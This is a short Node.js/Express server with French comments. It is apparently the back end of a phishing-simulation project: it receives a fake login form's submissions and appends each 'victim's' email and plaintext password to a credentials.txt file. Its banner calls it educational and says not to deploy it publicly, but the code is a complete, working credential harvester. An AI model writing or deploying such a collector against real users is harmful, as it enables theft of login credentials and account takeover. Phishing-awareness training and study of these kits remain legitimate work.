const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware pour analyser les données envoyées par le formulaire HTML (application/x-www-form-urlencoded)
app.use(bodyParser.urlencoded({ extended: true }));

// Indique à Express de servir les fichiers statiques (comme ton index.html) depuis le dossier 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Route principale pour intercepter la soumission du formulaire
app.post('/login', (req, res) => {
    // 1. Récupération des données saisies par la victime
    const email = req.body.email;
    const password = req.body.password;
    
    // 2. Horodatage pour savoir quand l'action s'est produite
    const timestamp = new Date().toISOString();
    
    // 3. Formatage de la ligne à enregistrer
    const logData = `[${timestamp}] Email: ${email} | Mot de passe: ${password}\n`;

    // 4. Écriture des données dans le fichier credentials.txt
    // La fonction appendFile ajoute les données à la fin du fichier sans écraser l'existant
    fs.appendFile('credentials.txt', logData, (err) => {
        if (err) {
            console.error("❌ Erreur lors de l'écriture dans le fichier :", err);
            return res.status(500).json({ ok: false });
        }
        console.log("✅ Nouveaux identifiants capturés avec succès !");
        res.status(200).json({ ok: true });
    });
});

// Démarrage du serveur
app.listen(PORT, () => {
    console.log(`===================================================`);
    console.log(`🚀 Serveur de simulation démarré sur le port ${PORT}`);
    console.log(`📁 Fichier de log : credentials.txt`);
    console.log(`===================================================`);
    console.log(`⚠️ RAPPEL : Ce projet consiste à développer un site de phishing simulé dans un cadre éducatif[cite: 58].`);
    console.log(`Ne pas déployer sur un serveur public.`);
});